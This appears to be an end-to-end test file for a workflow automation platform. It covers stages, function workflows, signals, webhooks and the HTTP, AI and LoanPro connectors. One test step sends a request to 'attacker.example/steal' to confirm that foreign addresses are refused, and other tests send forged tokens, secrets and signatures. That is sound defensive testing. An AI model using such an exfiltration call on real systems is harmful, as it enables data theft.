import { test, expect } from '../../support/test';
import { Api, expectForbidden, expectStatus } from '../../support/api';
import { connect, submitConnectorPage } from '../../support/connectors';
import { env } from '../../support/env';
import { deleteTenant, uniqueEmail } from '../../support/factories';
import { fakeRecords } from '../../support/fakes';
import { emailsTo } from '../../support/mailbox';
import { decide, prepareInstitution, waitForCase, waitForTask, type Institution } from '../../support/scenario';
import { publishWorkflow } from '../../support/workflows';
import { randomBytes } from 'node:crypto';

/**
 * Automation building blocks (docs/plans/12): business stages, functions (workflows used as steps), signals from other
 * systems (hook URLs and the API), the generic HTTP connector (calls and inbound webhooks), the AI connector's settings,
 * LoanPro's webhook signature, clients created and targeted by workflows.
 */
test.describe.configure({ timeout: 120_000 });

let inst: Institution;
let designer: Api;
let admin: Api;

test.beforeAll(async () => {
  inst = await prepareInstitution({ members: { designer: 'flow_designer', analyst: 'reviewer', ops: 'integration_manager' }, connections: ['sheets', 'loanpro'] });
  designer = Api.as(inst.members.designer);
  admin = inst.bank.adminApi;
});
test.afterAll(async () => { await deleteTenant(inst?.bank); });

const start = async (workflowId: string, inputs: Record<string, unknown> = {}) => {
  const res = await admin.post('/cases', { workflowId, inputs });
  expectStatus(res, 201);
  return res.body as { id: string; reference: string };
};
const createDraft = async (yaml: string) => {
  const res = await designer.post('/workflows', { yaml });
  expectStatus(res, 201);
  return res.body.id as string;
};

const end = (id = 'done', status = 'completed') => `  - { id: ${id}, name: Done, type: case.decision, config: { status: ${status}, notifyApplicant: false }, isTerminal: true, events: [{ name: done, outputs: [], next: [] }] }`;

/** Waits for a signal named `go` (at most `timeout`), after an optional task for the analysts. */
const signalWorkflow = (name: string, opts: { timeout?: string; taskFirst?: boolean } = {}) => `schemaVersion: "1"
name: "${name}"
description: waits for a signal
stages:
  - { key: waiting, label: Waiting for the go }
  - { key: go, label: Go received }
  - { key: timed_out, label: Timed out, exit: true }
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [${opts.taskFirst ? 'check' : 'waiting'}] }] }
  - { id: check, name: Check first, type: task, config: { title: "Check {{case.reference}}", assignTo: { role: reviewer } }, events: [{ name: done, outputs: [], next: [waiting] }] }
  - { id: waiting, name: Waiting, type: case.update, config: { stage: waiting, data: { hook: "= case.hooks.go" } }, events: [{ name: done, outputs: [], next: [wait] }] }
  - id: wait
    name: Wait for the go
    type: webhook.wait
    config: { name: go${opts.timeout ? `, timeout: ${opts.timeout}` : ''} }
    events: [{ name: received, outputs: [], next: [received] }, { name: timeout, outputs: [], next: [timed_out] }]
  - { id: received, name: Received, type: case.update, config: { stage: go, data: { by: "= steps.wait.by", source: "= steps.wait.signal.source" } }, events: [{ name: done, outputs: [], next: [done] }] }
  - { id: timed_out, name: Timed out, type: case.update, config: { stage: timed_out }, events: [{ name: done, outputs: [], next: [closed] }] }
${end()}
${end('closed', 'closed')}
`;

test.describe('AUT-01 Business stages', { tag: ['@flow-designer', '@AUT-01'] }, () => {
  test('an undeclared stage is refused at publication; stages show on the case and the pipeline board', async () => {
    const broken = await createDraft(`schemaVersion: "1"
name: "Stages: broken"
description: moves to a stage it does not declare
stages: [{ key: one, label: One }]
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [move] }] }
  - { id: move, name: Move, type: case.update, config: { stage: two }, events: [{ name: done, outputs: [], next: [done] }] }
${end()}
`);
    const refused = await designer.post(`/workflows/${broken}/publish`);
    expectStatus(refused, 422);
    expect(JSON.stringify(refused.body)).toContain('moves the case to the stage \\"two\\", which the workflow does not declare');

    const workflowId = await publishWorkflow(designer, signalWorkflow('Stages: board'));
    const kase = await start(workflowId);
    const waiting = await waitForCase(admin, kase.id, (c) => c.stage === 'waiting');
    expect(waiting.stages.map((s: any) => s.key)).toEqual(['waiting', 'go', 'timed_out']);
    expect(waiting.stages[2]).toMatchObject({ exit: true });
    const pipelines = (await Api.as(inst.members.analyst).get('/cases/pipelines')).body as any[];
    expect(pipelines.find((p) => p.id === workflowId)).toMatchObject({ name: 'Stages: board', stages: [{ key: 'waiting' }, { key: 'go' }, { key: 'timed_out' }] });
    const listed = (await admin.get(`/cases?workflowId=${workflowId}`)).body as any[];
    expect(listed.find((c) => c.id === kase.id)).toMatchObject({ stage: 'waiting' });
    // The timeline says when it moved.
    const timeline = (await admin.get(`/cases/${kase.id}/timeline`)).body as any[];
    expect(timeline.map((e) => e.action)).toContain('case.stage_changed');
  });
});

test.describe('AUT-02 Functions: workflows other workflows use as a step', { tag: ['@flow-designer', '@AUT-02'] }, () => {
  test('a function is published, shows in the palette, runs as a step and gives its outputs back', async () => {
    const functionId = await publishWorkflow(designer, `schemaVersion: "1"
name: "Function: add"
description: adds two numbers
function: true
inputs:
  - { id: a, name: a, label: First number, type: number, required: true }
  - { id: b, name: b, label: Second number, type: number, required: true }
outputs:
  sum: "= steps.add.sum"
  label: "= 'sum of ' & $string(input.a) & ' and ' & $string(input.b)"
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [add] }] }
  - { id: add, name: Add, type: calculate, config: { outputs: { sum: "$number(input.a) + $number(input.b)" } }, events: [{ name: done, outputs: [], next: [done] }] }
${end()}
`);
    const palette = (await designer.get('/workflow-components')).body as any[];
    const component = palette.find((c) => c.type === `function:${functionId}`);
    expect(component).toMatchObject({ title: 'Function: add', category: 'function', source: { kind: 'function', workflowId: functionId } });
    expect(Object.keys(component.configSchema.properties.inputs.properties)).toEqual(['a', 'b']);

    const callerId = await publishWorkflow(designer, `schemaVersion: "1"
name: "Caller"
description: uses the add function
inputs: [{ id: x, name: x, type: number, required: true }]
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [call] }] }
  - id: call
    name: Add ten
    type: "function:${functionId}"
    config: { inputs: { a: "= input.x", b: "10" } }
    events: [{ name: completed, outputs: [], next: [save] }, { name: failed, outputs: [], next: [] }]
  - { id: save, name: Save, type: case.update, config: { data: { sum: "= steps.call.sum", label: "= steps.call.label" } }, events: [{ name: done, outputs: [], next: [done] }] }
${end()}
`);
    const kase = await start(callerId, { x: 32 });
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done.data).toMatchObject({ sum: 42, label: 'sum of 32 and 10' });
  });

  test('only published functions can be called, and not by themselves', async () => {
    const plainId = await publishWorkflow(designer, `schemaVersion: "1"
name: "Not a function"
description: a plain workflow
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [done] }] }
${end()}
`);
    const draftFunction = await createDraft(`schemaVersion: "1"
name: "Draft function"
description: never published
function: true
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [done] }] }
${end()}
`);
    const caller = await createDraft(`schemaVersion: "1"
name: "Bad caller"
description: calls what it should not
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [one] }] }
  - { id: one, name: Plain, type: "function:${plainId}", config: { inputs: {} }, events: [{ name: completed, outputs: [], next: [two] }] }
  - { id: two, name: Draft, type: "function:${draftFunction}", config: { inputs: {} }, events: [{ name: completed, outputs: [], next: [done] }] }
${end()}
`);
    const refused = await designer.post(`/workflows/${caller}/publish`);
    expectStatus(refused, 422);
    const text = JSON.stringify(refused.body);
    expect(text).toContain('Plain: \\"Not a function\\" is not a function (function: true)');
    expect(text).toContain('Draft: the function is not published');

    // A function calling itself (no recursion).
    const selfYaml = (id: string) => `schemaVersion: "1"
name: "Recursive"
description: calls itself
function: true
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [again] }] }
  - { id: again, name: Again, type: "function:${id}", config: { inputs: {} }, events: [{ name: completed, outputs: [], next: [done] }] }
${end()}
`;
    const recursive = await createDraft(selfYaml('00000000-0000-4000-8000-000000000000'));
    expectStatus(await designer.put(`/workflows/${recursive}`, { yaml: selfYaml(recursive) }), 200);
    const self = await designer.post(`/workflows/${recursive}/publish`);
    expectStatus(self, 422);
    expect(JSON.stringify(self.body)).toContain('Again: a function cannot call itself');
  });

  test('a workflow started without waiting runs on its own; the caller carries on', async () => {
    const longId = await publishWorkflow(designer, signalWorkflow('Long runner'));
    const callerId = await publishWorkflow(designer, `schemaVersion: "1"
name: "Fire and forget"
description: starts the long runner and ends
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [spawn] }] }
  - { id: spawn, name: Start the long runner, type: workflow.call, config: { workflowId: ${longId}, wait: false, inputs: {} }, events: [{ name: started, outputs: [], next: [save] }] }
  - { id: save, name: Save, type: case.update, config: { data: { child: "= steps.spawn.reference" } }, events: [{ name: done, outputs: [], next: [done] }] }
${end()}
`);
    const kase = await start(callerId);
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    const children = (await admin.get(`/cases?workflowId=${longId}`)).body as any[];
    const child = children.find((c) => c.reference === done.data.child);
    expect(child).toBeTruthy();
    expect((await waitForCase(admin, child.id, (c) => c.stage === 'waiting')).status).toBe('in_progress');
  });
});

test.describe('AUT-03 Signals from other systems', { tag: ['@integrations', '@AUT-03'] }, () => {
  let workflowId: string;
  let earlyId: string;
  let timeoutId: string;
  test.beforeAll(async () => {
    workflowId = await publishWorkflow(designer, signalWorkflow('Signals: plain'));
    earlyId = await publishWorkflow(designer, signalWorkflow('Signals: after a check', { taskFirst: true }));
    timeoutId = await publishWorkflow(designer, signalWorkflow('Signals: with a deadline', { timeout: 'PT3S' }));
  });

  test('through the API: needs cases:signal; the payload reaches the workflow; finished cases refuse signals', async () => {
    const kase = await start(workflowId);
    await waitForCase(admin, kase.id, (c) => c.stage === 'waiting');
    await expect.poll(async () => ((await admin.get(`/cases/${kase.id}/signals`)).body as any[]).map((s) => `${s.name}:${s.status}`)).toEqual(['go:waiting']);
    expectForbidden(await Api.as(inst.members.analyst).post(`/cases/${kase.id}/signals/go`, { by: 'analyst' }));
    expectStatus(await Api.as(inst.members.ops).post(`/cases/${kase.id}/signals/go`, { blob: 'x'.repeat(70_000) }), 400);
    expectStatus(await Api.as(inst.members.ops).post(`/cases/${kase.id}/signals/Bad Name`, {}), [400, 404]);
    const sent = await Api.as(inst.members.ops).post(`/cases/${kase.id}/signals/go`, { by: 'core banking' });
    expectStatus(sent, 202);
    expect(sent.body).toMatchObject({ name: 'go', delivered: true, queued: false });
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done).toMatchObject({ stage: 'go', data: expect.objectContaining({ by: 'core banking', source: expect.stringMatching(/^member:/) }) });
    expect(((await admin.get(`/cases/${kase.id}/signals`)).body as any[])[0]).toMatchObject({ name: 'go', status: 'delivered', fields: ['by'] });
    expectStatus(await Api.as(inst.members.ops).post(`/cases/${kase.id}/signals/go`, {}), 409);
    const timeline = (await admin.get(`/cases/${kase.id}/timeline`)).body as any[];
    expect(timeline.map((e) => e.action)).toEqual(expect.arrayContaining(['case.waiting_for_signal', 'case.signal_received']));
  });

  test('through the case\'s hook URL: a forged token is refused, the real one works without an account', async () => {
    const kase = await start(workflowId);
    const waiting = await waitForCase(admin, kase.id, (c) => c.stage === 'waiting');
    const hook = waiting.data.hook as string;
    expect(hook).toContain(`/hooks/cases/${kase.id}/go?`);
    // The signals list gives the same address to those who may signal (cases:signal; SCN-12 checks the others).
    await expect.poll(async () => ((await admin.get(`/cases/${kase.id}/signals`)).body as any[])[0]?.hookUrl).toBe(hook);
    const post = (url: string, body: unknown) => fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    expect((await post(hook.replace(/token=[^&]+/, 'token=abc'), { by: 'forger' })).status).toBe(403);
    expect((await post(hook.replace(`/${kase.id}/go`, `/${kase.id}/other`), { by: 'forger' })).status).toBe(403);
    expect((await post(hook, { by: 'title service' })).status).toBe(202);
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done.data).toMatchObject({ by: 'title service', source: 'hook' });
  });

  test('a signal that arrives before the case waits for it is kept', async () => {
    const kase = await start(earlyId);
    const task = await waitForTask(Api.as(inst.members.analyst), kase.id);
    const sent = await Api.as(inst.members.ops).post(`/cases/${kase.id}/signals/go`, { by: 'early bird' });
    expectStatus(sent, 202);
    expect(sent.body).toMatchObject({ delivered: false, queued: true });
    expect(((await admin.get(`/cases/${kase.id}/signals`)).body as any[])[0]).toMatchObject({ status: 'pending' });
    const analyst = Api.as(inst.members.analyst);
    expectStatus(await analyst.post(`/tasks/${task.id}/claim`), 200);
    expectStatus(await analyst.post(`/tasks/${task.id}/decision`, { decision: 'done' }), 200);
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done.data).toMatchObject({ by: 'early bird' });
  });

  test('without a signal in time, the workflow takes its timeout branch', async () => {
    const kase = await start(timeoutId);
    const closed = await waitForCase(admin, kase.id, (c) => c.status === 'closed', 30_000);
    expect(closed.stage).toBe('timed_out');
    expect(((await admin.get(`/cases/${kase.id}/signals`)).body as any[])[0]).toMatchObject({ name: 'go', status: 'cancelled' });
  });
});

test.describe('AUT-04 The HTTP connector: any API, and its webhooks', { tag: ['@integrations', '@AUT-04'] }, () => {
  test('calls go to the connection\'s API with its credentials; refusals and foreign addresses end in "failed"', async () => {
    const sheet = `aut-${randomBytes(4).toString('hex')}`;
    const { installationId: broken, result } = await connect(inst.bank.adminApi, 'http', { label: 'Sheets with a bad token', baseUrl: env.fakes.sheets, authType: 'bearer', token: 'invalid' });
    expect(result.error).toBeNull();
    const workflowId = await publishWorkflow(designer, `schemaVersion: "1"
name: "HTTP calls"
description: append, read, a refused call and a foreign address
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [append] }] }
  - id: append
    name: Append
    type: "connector:http/request"
    config: { connection: ${inst.connections.sheets}, method: POST, input: { path: "/v4/spreadsheets/${sheet}/values/Log!A1:append", query: "= { 'valueInputOption': 'RAW' }", body: "= { 'values': [[case.reference, 'hello']] }" } }
    events: [{ name: succeeded, outputs: [], next: [read] }, { name: failed, outputs: [], next: [] }]
  - id: read
    name: Read
    type: "connector:http/request"
    config: { connection: ${inst.connections.sheets}, method: GET, input: { path: "/v4/spreadsheets/${sheet}/values/Log!A1:B10" } }
    events: [{ name: succeeded, outputs: [], next: [refused] }, { name: failed, outputs: [], next: [] }]
  - id: refused
    name: Refused
    type: "connector:http/request"
    config: { connection: ${broken}, method: GET, input: { path: "/v4/spreadsheets/${sheet}/values/Log!A1:B10" } }
    events: [{ name: succeeded, outputs: [], next: [] }, { name: failed, outputs: [], next: [foreign] }]
  - id: foreign
    name: Foreign address
    type: "connector:http/request"
    config: { connection: ${inst.connections.sheets}, method: GET, input: { path: "https://attacker.example/steal" } }
    events: [{ name: succeeded, outputs: [], next: [] }, { name: failed, outputs: [], next: [save] }]
  - id: save
    name: Save
    type: case.update
    config: { data: { rows: "= steps.read.body.values", refusedStatus: "= steps.refused.status", foreignError: "= steps.foreign.error" } }
    events: [{ name: done, outputs: [], next: [done] }]
${end()}
`);
    const kase = await start(workflowId);
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done.data).toMatchObject({ rows: [[kase.reference, 'hello']], refusedStatus: 401, foreignError: expect.stringContaining('relative to the connection') });
    const stored = await fakeRecords<{ rows: string[][] }>('sheets', `/spreadsheets/${sheet}`);
    expect(stored.rows).toEqual([[kase.reference, 'hello']]);
  });

  test('a webhook of the connected system starts the workflows listening to it; a wrong secret is refused', async () => {
    const { installationId } = await connect(inst.bank.adminApi, 'http', { label: 'Dealer management system', baseUrl: env.fakes.sheets, authType: 'none', webhookSecret: 'dms-hook-secret' });
    const workflowId = await publishWorkflow(designer, `schemaVersion: "1"
name: "Dealer created in the DMS"
description: started by the DMS webhook
caseTitle: "New dealer: {{input.body.name}}"
startOn: ["connector:http/webhook.dealer_created"]
inputs: []
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [save] }] }
  - { id: save, name: Save, type: case.update, config: { data: { dealer: "= input.body.name", via: "= input.connection" } }, events: [{ name: done, outputs: [], next: [done] }] }
${end()}
`);
    const url = `${env.connectors.http}/hooks/${installationId}/dealer_created`;
    const body = JSON.stringify({ name: 'Hill Country Autos', license: 'P-104233' });
    const wrong = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Webhook-Secret': 'guess' }, body });
    expect(wrong.status).toBe(401);
    const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Webhook-Secret': 'dms-hook-secret', 'Webhook-Id': `evt-${randomBytes(4).toString('hex')}` }, body });
    expect(res.status).toBe(202);
    const { started } = await res.json() as { started: string[] };
    expect(started).toHaveLength(1);
    const kase = ((await admin.get(`/cases?workflowId=${workflowId}`)).body as any[]).find((c) => c.reference === started[0]);
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done).toMatchObject({ title: 'New dealer: Hill Country Autos', source: 'event:connector:http/webhook.dealer_created', data: expect.objectContaining({ dealer: 'Hill Country Autos', via: 'Dealer management system' }) });
  });
});

test.describe('AUT-05/06 AI and LoanPro connections', { tag: ['@integrations', '@AUT-05', '@AUT-06'] }, () => {
  test('the AI provider refusing the key is reported on the settings page', async () => {
    const started = await inst.bank.adminApi.post('/integrations/ai/install');
    expectStatus(started, 201);
    const refused = await submitConnectorPage(started.body.url, { baseUrl: `${env.fakes.llm}/v1`, apiKey: 'sk-invalid', model: 'fake-extractor-1' });
    expect(refused.saved).toBe(false);
    expect(refused.error).toContain('The provider refused the API key');
  });

  test('LoanPro webhooks without the right signature are refused', async () => {
    const url = `${env.connectors.loanpro}/webhooks/loanpro/${inst.connections.loanpro}`;
    const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-LoanPro-Signature': 'sha256=00' }, body: JSON.stringify({ id: 'evt_forged', event: 'loan.paid_off', loanId: 1 }) });
    expect(res.status).toBe(401);
  });
});

test.describe('AUT-07 Workflows that create and serve other clients', { tag: ['@client', '@AUT-07'] }, () => {
  test('client.upsert creates a client once (then finds them), invites them, and steps can write to their app', async () => {
    const email = uniqueEmail('borrower', 'buyers.example');
    const since = Date.now() - 1000;
    const workflowId = await publishWorkflow(designer, `schemaVersion: "1"
name: "Make a borrower"
description: creates a client and writes to their app
inputs: [{ id: email, name: email, type: string, required: true }]
steps:
  - { id: start, name: Start, type: start, events: [{ name: finished, outputs: [], next: [first] }] }
  - id: first
    name: Create
    type: client.upsert
    config: { email: "= input.email", name: Robin Borrower, addSegments: [borrower], attributes: { loanNumber: "L-1" }, invite: true, inviteMessage: "Your loan is with us." }
    events: [{ name: created, outputs: [], next: [record] }, { name: existing, outputs: [], next: [record] }]
  - { id: record, name: Their loan, type: client.record, config: { client: "= steps.first.clientId", collection: loans, key: L-1, mode: upsert, data: { balance: "12000", currency: USD } }, events: [{ name: done, outputs: [], next: [again] }] }
  - id: again
    name: Again
    type: client.upsert
    config: { email: "= input.email", name: Robin Borrower, invite: true }
    events: [{ name: created, outputs: [], next: [save] }, { name: existing, outputs: [], next: [save] }]
  - { id: save, name: Save, type: case.update, config: { data: { first: "= steps.first.created", second: "= steps.again.created", same: "= steps.first.clientId = steps.again.clientId" } }, events: [{ name: done, outputs: [], next: [done] }] }
${end()}
`);
    const kase = await start(workflowId, { email });
    const done = await waitForCase(admin, kase.id, (c) => c.status === 'completed', 30_000);
    expect(done.data).toMatchObject({ first: true, second: false, same: true });
    // Invited once; the record is in the new client's app.
    await expect.poll(async () => (await emailsTo({ tenant: inst.bank.key, to: email, since })).length, { timeout: 15_000 }).toBe(1);
    const clients = (await admin.get(`/clients?search=${encodeURIComponent(email)}`)).body;
    const client = (Array.isArray(clients) ? clients : clients.items ?? []).find((c: any) => c.email === email);
    expect(client).toBeTruthy();
  });
});
